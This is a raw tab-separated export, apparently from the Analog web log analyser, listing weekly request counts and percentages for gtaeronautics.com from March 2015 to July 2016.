x	VE	analog 5.24
x	HN	gtaeronautics.com
W	Rr	1171	0.122	2016	07	17
W	Rr	1167	0.121	2016	07	10
W	Rr	917	0.095	2016	07	03
W	Rr	920	0.095	2016	06	26
W	Rr	1179	0.122	2016	06	19
W	Rr	1288	0.134	2016	06	12
W	Rr	1237	0.128	2016	06	05
W	Rr	1263	0.131	2016	05	29
W	Rr	1338	0.139	2016	05	22
W	Rr	1184	0.123	2016	05	15
W	Rr	1365	0.142	2016	05	08
W	Rr	974	0.101	2016	05	01
W	Rr	1311	0.136	2016	04	24
W	Rr	1127	0.117	2016	04	17
W	Rr	1248	0.130	2016	04	10
W	Rr	1451	0.151	2016	04	03
W	Rr	987	0.102	2016	03	27
W	Rr	1233	0.128	2016	03	20
W	Rr	1347	0.140	2016	03	13
W	Rr	1347	0.140	2016	03	06
W	Rr	1236	0.128	2016	02	28
W	Rr	1422	0.148	2016	02	21
W	Rr	1085	0.113	2016	02	14
W	Rr	1427	0.148	2016	02	07
W	Rr	1359	0.141	2016	01	31
W	Rr	1708	0.177	2016	01	24
W	Rr	1476	0.153	2016	01	17
W	Rr	1563	0.162	2016	01	10
W	Rr	1381	0.143	2016	01	03
W	Rr	1273	0.132	2015	12	27
W	Rr	1084	0.113	2015	12	20
W	Rr	1344	0.140	2015	12	13
W	Rr	1336	0.139	2015	12	06
W	Rr	1123	0.117	2015	11	29
W	Rr	960	0.100	2015	11	22
W	Rr	1337	0.139	2015	11	15
W	Rr	1400	0.145	2015	11	08
W	Rr	1383	0.144	2015	11	01
W	Rr	1250	0.130	2015	10	25
W	Rr	1366	0.142	2015	10	18
W	Rr	1367	0.142	2015	10	11
W	Rr	1214	0.126	2015	10	04
W	Rr	1152	0.120	2015	09	27
W	Rr	1387	0.144	2015	09	20
W	Rr	1655	0.172	2015	09	13
W	Rr	1526	0.158	2015	09	06
W	Rr	1242	0.129	2015	08	30
W	Rr	1800	0.187	2015	08	23
W	Rr	1527	0.158	2015	08	16
W	Rr	1386	0.144	2015	08	09
W	Rr	1593	0.165	2015	08	02
W	Rr	1567	0.163	2015	07	26
W	Rr	1980	0.206	2015	07	19
W	Rr	2180	0.226	2015	07	12
W	Rr	2008	0.208	2015	07	05
W	Rr	2297	0.238	2015	06	28
W	Rr	1556	0.162	2015	06	21
W	Rr	1380	0.143	2015	06	14
W	Rr	2013	0.209	2015	06	07
W	Rr	1651	0.171	2015	05	31
W	Rr	1224	0.127	2015	05	24
W	Rr	1355	0.141	2015	05	17
W	Rr	1179	0.122	2015	05	10
W	Rr	1436	0.149	2015	05	03
W	Rr	1671	0.173	2015	04	26
W	Rr	1878	0.195	2015	04	19
W	Rr	2326	0.241	2015	04	12
W	Rr	2636	0.274	2015	04	05
W	Rr	2297	0.238	2015	03	29
W	Rr	1237	0.128	2015	03	22
W	Rr	1453	0.151	2015	03	15
W	Rr	1399	0.145	2015	03	08
W	Rr	1287	0.134	2015	03	01
